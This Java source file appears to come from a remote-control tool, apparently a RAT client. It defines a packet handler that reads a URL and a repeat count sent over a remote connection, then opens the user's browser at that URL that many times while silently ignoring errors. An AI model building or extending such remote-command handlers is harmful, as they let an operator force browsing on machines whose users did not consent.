package com.redpois0n.packets;

import java.net.URI;

import com.redpois0n.Connection;


public class PacketVISITURLMUCH extends Packet {

	@Override
	public void read(String line) throws Exception {
		String url = Connection.readLine();
		int times = Integer.parseInt(Connection.readLine());
		try {
			for (int i = 0; i < times; i++) {
				java.awt.Desktop.getDesktop().browse(new URI(url));
			}
		} catch (Exception ex) {
		}
	}

}
